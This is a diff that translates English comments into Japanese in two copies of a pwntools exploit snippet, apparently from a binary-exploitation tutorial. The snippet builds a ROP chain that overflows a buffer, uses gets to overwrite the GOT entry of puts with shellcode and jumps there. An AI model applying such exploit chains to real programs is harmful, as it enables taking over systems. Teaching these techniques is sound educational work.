@@ -41,8 +41,8 @@ p = process()
 rop = ROP(elf)
 
 rop.raw('A' * 32)
-rop.gets(elf.got['puts'])      # Call gets, writing to the GOT entry of puts
-rop.raw(elf.got['puts'])       # now our shellcode is written there, we can continue execution from there
+rop.gets(elf.got['puts'])      # gets を呼び、puts の GOT エントリに書き込む
+rop.raw(elf.got['puts'])       # ここにシェルコードが書き込まれたので、そこから実行を続けられる
 
 p.recvline()
 p.sendline(rop.chain())
@@ -63,8 +63,8 @@ p = process()
 rop = ROP(elf)
 
 rop.raw('A' * 32)
-rop.gets(elf.got['puts'])      # Call gets, writing to the GOT entry of puts
-rop.raw(elf.got['puts'])       # now our shellcode is written there, we can continue execution from there
+rop.gets(elf.got['puts'])      # gets を呼び、puts の GOT エントリに書き込む
+rop.raw(elf.got['puts'])       # ここにシェルコードが書き込まれたので、そこから実行を続けられる
 
 p.recvline()
 p.sendline(rop.chain())
